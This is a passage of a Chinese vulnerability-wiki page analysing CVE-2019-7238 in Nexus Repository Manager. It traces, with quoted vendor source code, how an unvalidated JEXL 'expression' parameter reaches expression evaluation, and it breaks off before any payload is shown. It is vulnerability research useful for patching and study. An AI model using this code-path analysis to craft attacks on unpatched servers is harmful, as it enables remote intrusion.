<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Nexus/%EF%BC%88CVE-2019-7238%EF%BC%89Nexus%20Repository%20Manager%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>（CVE-2019-7238）Nexus Repository Manager 远程代码执行 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "\uff08CVE-2019-7238\uff09Nexus Repository Manager \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c", url: "#_top", children: [
              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_6" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../%EF%BC%88CVE-2020-10199%EF%BC%89Nexus%20Repository%20Manager%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../%EF%BC%88CVE-2020-10199%EF%BC%89Nexus%20Repository%20Manager%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2020-10199）Nexus Repository Manager 远程代码执行漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%EF%BC%88CVE-2019-5475%EF%BC%89Nexus2%20yum%E6%8F%92%E4%BB%B6RCE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%EF%BC%88CVE-2019-5475%EF%BC%89Nexus2%20yum%E6%8F%92%E4%BB%B6RCE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2019-5475）Nexus2 yum插件RCE漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="cve-2019-7238nexus-repository-manager">（CVE-2019-7238）Nexus Repository Manager 远程代码执行<a class="headerlink" href="#cve-2019-7238nexus-repository-manager" title="Permanent link">&para;</a></h1>
<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<p>Nexus Repository Manager OSS/Pro 3.6.2 版本到 3.14.0 版本</p>
<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
<p>定位到如下位置
plugins/nexus-coreui-plugin/src/main/java/org/sonatype/nexus/coreui/ComponentComponent.groovy:185</p>
<div class="codehilite"><pre><span></span><code><span class="err">@</span><span class="n">Named</span>
<span class="err">@</span><span class="n">Singleton</span>
<span class="err">@</span><span class="n">DirectAction</span><span class="p">(</span><span class="n">action</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;coreui_Component&#39;</span><span class="p">)</span>
<span class="k">class</span><span class="w"> </span><span class="n">ComponentComponent</span>
<span class="w">    </span><span class="k">extends</span><span class="w"> </span><span class="n">DirectComponentSupport</span>
<span class="p">{</span>
<span class="w">    </span><span class="o">...</span>

<span class="w">    </span><span class="err">@</span><span class="n">DirectMethod</span>
<span class="w">    </span><span class="err">@</span><span class="n">Timed</span>
<span class="w">    </span><span class="err">@</span><span class="n">ExceptionMetered</span>
<span class="w">    </span><span class="n">PagedResponse</span><span class="o">&lt;</span><span class="n">AssetXO</span><span class="o">&gt;</span><span class="w"> </span><span class="n">previewAssets</span><span class="p">(</span><span class="n">final</span><span class="w"> </span><span class="n">StoreLoadParameters</span><span class="w"> </span><span class="n">parameters</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>

<span class="w">        </span><span class="nb nb-Type">String</span><span class="w"> </span><span class="n">repositoryName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">parameters</span><span class="o">.</span><span class="n">getFilter</span><span class="p">(</span><span class="s1">&#39;repositoryName&#39;</span><span class="p">)</span>
<span class="w">        </span><span class="nb nb-Type">String</span><span class="w"> </span><span class="n">expression</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">parameters</span><span class="o">.</span><span class="n">getFilter</span><span class="p">(</span><span class="s1">&#39;expression&#39;</span><span class="p">)</span>
<span class="w">        </span><span class="nb nb-Type">String</span><span class="w"> </span><span class="n">type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">parameters</span><span class="o">.</span><span class="n">getFilter</span><span class="p">(</span><span class="s1">&#39;type&#39;</span><span class="p">)</span>
<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="err">接收三个参数</span><span class="w"> </span><span class="n">repositoryName</span><span class="w"> </span><span class="err">、</span><span class="w"> </span><span class="n">expression</span><span class="w"> </span><span class="err">、</span><span class="w"> </span><span class="n">type</span>

<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">expression</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">!</span><span class="n">type</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">!</span><span class="n">repositoryName</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nb nb-Type">null</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="err">设置</span><span class="w"> </span><span class="n">repositoryName</span>
<span class="w">        </span><span class="n">RepositorySelector</span><span class="w"> </span><span class="n">repositorySelector</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">RepositorySelector</span><span class="o">.</span><span class="n">fromSelector</span><span class="p">(</span><span class="n">repositoryName</span><span class="p">)</span>

<span class="w">        </span><span class="o">//</span><span class="w"> </span><span class="err">根据</span><span class="w"> </span><span class="n">type</span><span class="w"> </span><span class="err">分别调用不同的</span><span class="w"> </span><span class="n">validate</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">type</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">JexlSelector</span><span class="o">.</span><span class="n">TYPE</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">jexlExpressionValidator</span><span class="o">.</span><span class="n">validate</span><span class="p">(</span><span class="n">expression</span><span class="p">)</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">type</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">CselSelector</span><span class="o">.</span><span class="n">TYPE</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="n">cselExpressionValidator</span><span class="o">.</span><span class="n">validate</span><span class="p">(</span><span class="n">expression</span><span class="p">)</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="n">List</span><span class="o">&lt;</span><span class="n">Repository</span><span class="o">&gt;</span><span class="w"> </span><span class="n">selectedRepositories</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">getPreviewRepositories</span><span class="p">(</span><span class="n">repositorySelector</span><span class="p">)</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">selectedRepositories</span><span class="o">.</span><span class="n">size</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nb nb-Type">null</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="n">def</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">browseService</span><span class="o">.</span><span class="n">previewAssets</span><span class="p">(</span>
<span class="w">            </span><span class="n">repositorySelector</span><span class="p">,</span>
<span class="w">            </span><span class="n">selectedRepositories</span><span class="p">,</span>
<span class="w">            </span><span class="n">expression</span><span class="p">,</span>
<span class="w">            </span><span class="n">toQueryOptions</span><span class="p">(</span><span class="n">parameters</span><span class="p">))</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">PagedResponse</span><span class="o">&lt;</span><span class="n">AssetXO</span><span class="o">&gt;</span><span class="p">(</span>
<span class="w">            </span><span class="n">result</span><span class="o">.</span><span class="n">total</span><span class="p">,</span>
<span class="w">            </span><span class="n">result</span><span class="o">.</span><span class="n">results</span><span class="o">.</span><span class="n">collect</span><span class="p">(</span><span class="n">ASSET_CONVERTER</span><span class="o">.</span><span class="n">rcurry</span><span class="p">(</span><span class="nb nb-Type">null</span><span class="p">,</span><span class="w"> </span><span class="nb nb-Type">null</span><span class="p">,</span><span class="w"> </span><span class="p">[:],</span><span class="w"> </span><span class="mi">0</span><span class="p">))</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">buckets</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">needed</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">asset</span><span class="w"> </span><span class="n">preview</span><span class="w"> </span><span class="n">screen</span>
<span class="w">        </span><span class="p">)</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span>
<span class="w">    </span><span class="o">...</span>
<span class="p">}</span>
</code></pre></div>

<p>Nexus为了查询方便，特地在jexl的基础上引入了csel表达式。简单起见，这里不做展开。接着我们跟入<code>browseService.previewAssets</code>，接口定义在
components/nexus-repository/src/main/java/org/sonatype/nexus/repository/browse/BrowseService.java:59</p>
<div class="codehilite"><pre><span></span><code><span class="o">/**</span>
<span class="w">   </span><span class="o">*</span><span class="w"> </span><span class="n">Returns</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="p">{@</span><span class="nb">link</span><span class="w"> </span><span class="n">BrowseResult</span><span class="p">}</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">previewing</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">specified</span><span class="w"> </span><span class="n">repository</span><span class="w"> </span><span class="n">based</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">an</span><span class="w"> </span><span class="n">arbitrary</span><span class="w"> </span><span class="n">content</span><span class="w"> </span><span class="n">selector</span><span class="p">.</span>
<span class="w">   </span><span class="o">*/</span>
<span class="w">  </span><span class="n">BrowseResult</span><span class="o">&lt;</span><span class="n">Asset</span><span class="o">&gt;</span><span class="w"> </span><span class="n">previewAssets</span><span class="p">(</span><span class="n">final</span><span class="w"> </span><span class="n">RepositorySelector</span><span class="w"> </span><span class="n">selectedRepository</span><span class="p">,</span>
<span class="w">                                    </span><span class="n">final</span><span class="w"> </span><span class="n">List</span><span class="o">&lt;</span><span class="n">Repository</span><span class="o">&gt;</span><span class="w"> </span><span class="n">repositories</span><span class="p">,</span>
<span class="w">                                    </span><span class="n">final</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">jexlExpression</span><span class="p">,</span>
<span class="w">                                    </span><span class="n">final</span><span class="w"> </span><span class="n">QueryOptions</span><span class="w"> </span><span class="n">queryOptions</span><span class="p">);</span>
</code></pre></div>

<p>具体实现在
components/nexus-repository/src/main/java/org/sonatype/nexus/repository/browse/internal/BrowseServiceImpl.java:233</p>
<div class="codehilite"><pre><span></span><code><span class="err">@</span><span class="n">Named</span>
<span class="err">@</span><span class="n">Singleton</span>
<span class="n">public</span><span class="w"> </span><span class="k">class</span><span class="w"> </span><span class="n">BrowseServiceImpl</span>
<span class="w">    </span><span class="k">extends</span><span class="w"> </span><span class="n">ComponentSupport</span>
<span class="w">    </span><span class="n">implements</span><span class="w"> </span><span class="n">BrowseService</span>
<span class="p">{</span>
<span class="w">  </span><span class="o">...</span>
<span class="w">  </span><span class="err">@</span><span class="n">Override</span>
<span class="w">  </span><span class="n">public</span><span class="w"> </span><span class="n">BrowseResult</span><span class="o">&lt;</span><span class="n">Asset</span><span class="o">&gt;</span><span class="w"> </span><span class="n">previewAssets</span><span class="p">(</span><span class="n">final</span><span class="w"> </span><span class="n">RepositorySelector</span><span class="w"> </span><span class="n">repositorySelector</span><span class="p">,</span>
<span class="w">                                          </span><span class="n">final</span><span class="w"> </span><span class="n">List</span><span class="o">&lt;</span><span class="n">Repository</span><span class="o">&gt;</span><span class="w"> </span><span class="n">repositories</span><span class="p">,</span>
<span class="w">                                          </span><span class="n">final</span><span class="w"> </span><span class="nb nb-Type">String</span><span class="w"> </span><span class="n">jexlExpression</span><span class="p">,</span>
<span class="w">                                          </span><span class="n">final</span><span class="w"> </span><span class="n">QueryOptions</span><span class="w"> </span><span class="n">queryOptions</span><span class="p">)</span>
<span class="w">  </span><span class="p">{</span>
<span class="w">    </span><span class="n">checkNotNull</span><span class="p">(</span><span class="n">repositories</span><span class="p">);</span>
<span class="w">    </span><span class="n">checkNotNull</span><span class="p">(</span><span class="n">jexlExpression</span><span class="p">);</span>
<span class="w">    </span><span class="n">final</span><span class="w"> </span><span class="n">Repository</span><span class="w"> </span><span class="n">repository</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">repositories</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="w">    </span><span class="n">try</span><span class="w"> </span><span class="p">(</span><span class="n">StorageTx</span><span class="w"> </span><span class="n">storageTx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">repository</span><span class="o">.</span><span class="n">facet</span><span class="p">(</span><span class="n">StorageFacet</span><span class="o">.</span><span class="k">class</span><span class="p">)</span><span class="o">.</span><span class="n">txSupplier</span><span class="p">()</span><span class="o">.</span><span class="n">get</span><span class="p">())</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="n">storageTx</span><span class="o">.</span><span class="n">begin</span><span class="p">();</span>
<span class="w">      </span><span class="n">List</span><span class="o">&lt;</span><span class="n">Repository</span><span class="o">&gt;</span><span class="w"> </span><span class="n">previewRepositories</span><span class="p">;</span>
<span class="w">      </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">repositories</span><span class="o">.</span><span class="n">size</span><span class="p">()</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">groupType</span><span class="o">.</span><span class="n">equals</span><span class="p">(</span><span class="n">repository</span><span class="o">.</span><span class="n">getType</span><span class="p">()))</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">previewRepositories</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">repository</span><span class="o">.</span><span class="n">facet</span><span class="p">(</span><span class="n">GroupFacet</span><span class="o">.</span><span class="k">class</span><span class="p">)</span><span class="o">.</span><span class="n">leafMembers</span><span class="p">();</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">      </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="n">previewRepositories</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">repositories</span><span class="p">;</span>
<span class="w">      </span><span class="p">}</span>

<span class="w">      </span><span class="n">PreviewAssetsSqlBuilder</span><span class="w"> </span><span class="n">builder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">PreviewAssetsSqlBuilder</span><span class="p">(</span>
<span class="w">          </span><span class="n">repositorySelector</span><span class="p">,</span>
<span class="w">          </span><span class="n">jexlExpression</span><span class="p">,</span>
<span class="w">          </span><span class="n">queryOptions</span><span class="p">,</span>
<span class="w">          </span><span class="n">getRepoToContainedGroupMap</span><span class="p">(</span><span class="n">repositories</span><span class="p">));</span>

<span class="w">      </span><span class="nb nb-Type">String</span><span class="w"> </span><span class="n">whereClause</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb nb-Type">String</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="s2">&quot;and (</span><span class="si">%s</span><span class="s2">)&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">builder</span><span class="o">.</span><span class="n">buildWhereClause</span><span class="p">());</span>

<span class="w">      </span><span class="o">//</span><span class="n">The</span><span class="w"> </span><span class="n">whereClause</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">passed</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">querySuffix</span><span class="w"> </span><span class="n">so</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">contentExpression</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">after</span><span class="w"> </span><span class="n">repository</span><span class="w"> </span><span class="n">filtering</span>
<span class="w">      </span><span class="k">return</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">BrowseResult</span><span class="o">&lt;&gt;</span><span class="p">(</span>
<span class="w">          </span><span class="n">storageTx</span><span class="o">.</span><span class="n">countAssets</span><span class="p">(</span><span class="nb nb-Type">null</span><span class="p">,</span><span class="w"> </span><span class="n">builder</span><span class="o">.</span><span class="n">buildSqlParams</span><span class="p">(),</span><span class="w"> </span><span class="n">previewRepositories</span><span class="p">,</span><span class="w"> </span><span class="n">whereClause</span><span class="p">),</span>
<span class="w">          </span><span class="n">Lists</span><span class="o">.</span><span class="n">newArrayList</span><span class="p">(</span><span class="n">storageTx</span><span class="o">.</span><span class="n">findAssets</span><span class="p">(</span><span class="nb nb-Type">null</span><span class="p">,</span><span class="w"> </span><span class="n">builder</span><span class="o">.</span><span class="n">buildSqlParams</span><span class="p">(),</span>
<span class="w">              </span><span class="n">previewRepositories</span><span class="p">,</span><span class="w"> </span><span class="n">whereClause</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">builder</span><span class="o">.</span><span class="n">buildQuerySuffix</span><span class="p">()))</span>
<span class="w">      </span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="w">  </span><span class="p">}</span>
<span class="w">  </span><span class="o">...</span>
<span class="p">}</span>
</code></pre></div>

<p>注意上面代码中的英文注释，大意为<code>whereClause</code>条件在完成<code>repository filtering</code>后将会进行<code>contentExpression</code>。而<code>whereClause</code>是通过前面一系列Builder构建的。可以跟入<code>builder.buildWhereClause()</code>，在
components/nexus-repository/src/main/java/org/sonatype/nexus/repository/browse/internal/PreviewAssetsSqlBuilder.java:51
， 这里最终引入了contentExpression和jexlExpression:</p>
<div class="codehilite"><pre><span></span><code><span class="k">public</span><span class="w"> </span><span class="k">class</span><span class="w"> </span><span class="n">PreviewAssetsSqlBuilder</span>
<span class="err">{</span>
<span class="w">  </span><span class="p">...</span>
<span class="w">  </span><span class="k">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">buildWhereClause</span><span class="p">()</span><span class="w"> </span><span class="err">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">whereClause</span><span class="p">(</span><span class="ss">&quot;contentExpression(@this, :jexlExpression, :repositorySelector, &quot;</span><span class="w"> </span><span class="o">+</span>
<span class="w">        </span><span class="ss">&quot;:repoToContainedGroupMap) == true&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">queryOptions</span><span class="p">.</span><span class="n">getFilter</span><span class="p">()</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="k">null</span><span class="p">);</span>
<span class="w">  </span><span class="err">}</span>
<span class="w">  </span><span class="p">...</span>
<span class="err">}</span>
</code></pre></div>

<p>接下来即考虑如何进一步执行<code>contentExpression</code>。在
components/nexus-repository/src/main/java/org/sonatype/nexus/repository/selector/internal/ContentExpressionFunction.java
。当<code>contentExpression</code>执行时，会调用<code>execute</code>方法：</p>
<div class="codehilite"><pre><span></span><code><span class="n">public</span><span class="w"> </span><span class="k">class</span><span class="w"> </span><span class="n">ContentExpressionFunction</span>
<span class="w">    </span><span class="k">extends</span><span class="w"> </span><span class="n">OSQLFunctionAbstract</span>
<span class="p">{</span>
<span class="w">  </span><span class="n">public</span><span class="w"> </span><span class="k">static</span><span class="w"> </span><span class="n">final</span><span class="w"> </span><span class="nb nb-Type">String</span><span class="w"> </span><span class="n">NAME</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;contentExpression&quot;</span><span class="p">;</span>
<span class="w">  </span><span class="o">...</span>
<span class="w">  </span><span class="err">@</span><span class="n">Inject</span>
<span class="w">  </span><span class="n">public</span><span class="w"> </span><span class="n">ContentExpressionFunction</span><span class="p">(</span><span class="n">final</span><span class="w"> </span><span class="n">VariableResolverAdapterManager</span><span class="w"> </span><span class="n">variableResolverAdapterManager</span><span class="p">,</span>
<span class="w">                                   </span><span class="n">final</span><span class="w"> </span><span class="n">SelectorManager</span><span class="w"> </span><span class="n">selectorManager</span><span class="p">,</span>
<span class="w">                                   </span><span class="n">final</span><span class="w"> </span><span class="n">ContentAuthHelper</span><span class="w"> </span><span class="n">contentAuthHelper</span><span class="p">)</span>
<span class="w">  </span><span class="p">{</span>
<span class="w">    </span><span class="n">super</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">);</span>
<span class="w">    </span><span class="n">this</span><span class="o">.</span><span class="n">variableResolverAdapterManager</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">checkNotNull</span><span class="p">(</span><span class="n">variableResolverAdapterManager</span><span class="p">);</span>
<span class="w">    </span><span class="n">this</span><span class="o">.</span><span class="n">selectorManager</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">checkNotNull</span><span class="p">(</span><span class="n">selectorManager</span><span class="p">);</span>
<span class="w">    </span><span class="n">this</span><span class="o">.</span><span class="n">contentAuthHelper</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">checkNotNull</span><span class="p">(</span><span class="n">contentAuthHelper</span><span class="p">);</span>
<span class="w">  </span><span class="p">}</span>

<span class="w">  </span><span class="err">@</span><span class="n">Override</span>
<span class="w">  </span><span class="n">public</span><span class="w"> </span><span class="nb nb-Type">Object</span><span class="w"> </span><span class="n">execute</span><span class="p">(</span><span class="n">final</span><span class="w"> </span><span class="nb nb-Type">Object</span><span class="w"> </span><span class="n">iThis</span><span class="p">,</span>
<span class="w">                        </span><span class="n">final</span><span class="w"> </span><span class="n">OIdentifiable</span><span class="w"> </span><span class="n">iCurrentRecord</span><span class="p">,</span>
<span class="w">                        </span><span class="n">final</span><span class="w"> </span><span class="nb nb-Type">Object</span><span class="w"> </span><span class="n">iCurrentResult</span><span class="p">,</span>
<span class="w">                        </span><span class="n">final</span><span class="w"> </span><span class="nb nb-Type">Object</span><span class="p">[]</span><span class="w"> </span><span class="n">iParams</span><span class="p">,</span>
<span class="w">                        </span><span class="n">final</span><span class="w"> </span><span class="n">OCommandContext</span><span class="w"> </span><span class="n">iContext</span><span class="p">)</span>
<span class="w">  </span><span class="p">{</span>
<span class="w">    </span><span class="n">OIdentifiable</span><span class="w"> </span><span class="n">identifiable</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">OIdentifiable</span><span class="p">)</span><span class="w"> </span><span class="n">iParams</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="n">asset</span><span class="w"> </span>
<span class="w">    </span><span class="n">ODocument</span><span class="w"> </span><span class="n">asset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">identifiable</span><span class="o">.</span><span class="n">getRecord</span><span class="p">();</span>
<span class="w">    </span><span class="n">RepositorySelector</span><span class="w"> </span><span class="n">repositorySelector</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">RepositorySelector</span><span class="o">.</span><span class="n">fromSelector</span><span class="p">((</span><span class="nb nb-Type">String</span><span class="p">)</span><span class="w"> </span><span class="n">iParams</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="n">jexlExpression</span><span class="w"> </span><span class="err">即</span><span class="w"> </span><span class="n">iParams</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="w">    </span><span class="nb nb-Type">String</span><span class="w"> </span><span class="n">jexlExpression</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nb nb-Type">String</span><span class="p">)</span><span class="w"> </span><span class="n">iParams</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
<span class="w">    </span><span class="n">List</span><span class="o">&lt;</span><span class="nb nb-Type">String</span><span class="o">&gt;</span><span class="w"> </span><span class="n">membersForAuth</span><span class="p">;</span>

<span class="w">    </span><span class="o">...</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">contentAuthHelper</span><span class="o">.</span><span class="n">checkAssetPermissions</span><span class="p">(</span><span class="n">asset</span><span class="p">,</span><span class="w"> </span><span class="n">membersForAuth</span><span class="o">.</span><span class="n">toArray</span><span class="p">(</span><span class="n">new</span><span class="w"> </span><span class="nb nb-Type">String</span><span class="p">[</span><span class="n">membersForAuth</span><span class="o">.</span><span class="n">size</span><span class="p">()]))</span><span class="w"> </span><span class="o">&amp;&amp;</span>
<span class="w">        </span><span class="n">checkJexlExpression</span><span class="p">(</span><span class="n">asset</span><span class="p">,</span><span class="w"> </span><span class="n">jexlExpression</span><span class="p">,</span><span class="w"> </span><span class="n">asset</span><span class="o">.</span><span class="n">field</span><span class="p">(</span><span class="n">AssetEntityAdapter</span><span class="o">.</span><span class="n">P_FORMAT</span><span class="p">,</span><span class="w"> </span><span class="nb nb-Type">String</span><span class="o">.</span><span class="k">class</span><span class="p">));</span>
<span class="w">  </span><span class="p">}</span>
</code></pre></div>

<p>其中的<code>iParams</code>即可对应传入的参数。<code>iParams[0]</code>即<code>@this</code> ,
<code>iParams[1]</code>即<code>jexlExpression</code>,
<code>iParams[2]</code>即<code>repositorySelector</code>。在完成初步筛选出<code>asset</code>后进入最后的<code>checkJexlExpression</code></p>
<div class="codehilite"><pre><span></span><code><span class="o">...</span>
<span class="w">  </span><span class="n">private</span><span class="w"> </span><span class="n">boolean</span><span class="w"> </span><span class="n">checkJexlExpression</span><span class="p">(</span><span class="n">final</span><span class="w"> </span><span class="n">ODocument</span><span class="w"> </span><span class="n">asset</span><span class="p">,</span>
<span class="w">                                      </span><span class="n">final</span><span class="w"> </span><span class="nb nb-Type">String</span><span class="w"> </span><span class="n">jexlExpression</span><span class="p">,</span>
<span class="w">                                      </span><span class="n">final</span><span class="w"> </span><span class="nb nb-Type">String</span><span class="w"> </span><span class="n">format</span><span class="p">)</span>
<span class="w">  </span><span class="p">{</span>
<span class="w">    </span><span class="n">VariableResolverAdapter</span><span class="w"> </span><span class="n">variableResolverAdapter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">variableResolverAdapterManager</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">format</span><span class="p">);</span>
<span class="w">    </span><span class="o">//</span><span class="w"> </span><span class="n">variableSource</span><span class="w"> </span><span class="err">从</span><span class="w"> </span><span class="n">asset</span><span class="w"> </span><span class="err">中来</span>
<span class="w">    </span><span class="n">VariableSource</span><span class="w"> </span><span class="n">variableSource</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">variableResolverAdapter</span><span class="o">.</span><span class="n">fromDocument</span><span class="p">(</span><span class="n">asset</span><span class="p">);</span>

<span class="w">    </span><span class="n">SelectorConfiguration</span><span class="w"> </span><span class="n">selectorConfiguration</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">SelectorConfiguration</span><span class="p">();</span>

